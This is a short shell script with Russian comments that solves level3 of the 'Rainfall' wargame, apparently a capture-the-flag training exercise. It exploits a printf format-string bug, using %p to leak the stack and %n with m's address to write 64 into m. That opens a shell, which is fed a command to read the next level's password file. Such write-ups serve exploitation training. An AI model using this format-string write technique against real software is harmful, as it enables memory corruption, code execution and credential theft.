# 1. Запустить программу в дебаггере
# 2. Найти функцию v, вызываемую из main и глобальную переменную m
# 3. Найти в v небезопасную функцию printf, в которую можно передать в форматную строку
# 4. Увидеть в v запуск шелла при условии m == 64
# 5. Передавая в программу форматную строку с модификаторами %p можно добраться до сохранённого в буфер ввода
# 6. Определить позицию буфера относительно аргументов printf - 4
# 7. Добавив в начале ввода адрес переменной m, а в конце модификатор %n, можно записать произвольное число в m
# 8. Запустить программу со строкой нужной длины, чтобы при помощи %n записать 64 в m
# 9. Получить пароль из запущенного шелла

ssh level3@"$RAINFALL_IP" -p 4242 '
    # нахождение адреса m
    M_ADDRESS=$(gdb --batch -ex "info var" ./level3 | grep "m$" | awk "{print \$1}")
    # создание строки
    M_ADDRESS="\x${M_ADDRESS:8:2}\x${M_ADDRESS:6:2}\x${M_ADDRESS:4:2}\x${M_ADDRESS:2:2}"
    python -c "print \"$M_ADDRESS\" + \"x\" * 60 + \"%4\$n\"" > /tmp/level3
    # запуск программы и получение флага
    (cat /tmp/level3 - | ./level3) <<< "cat /home/user/level4/.pass"
'
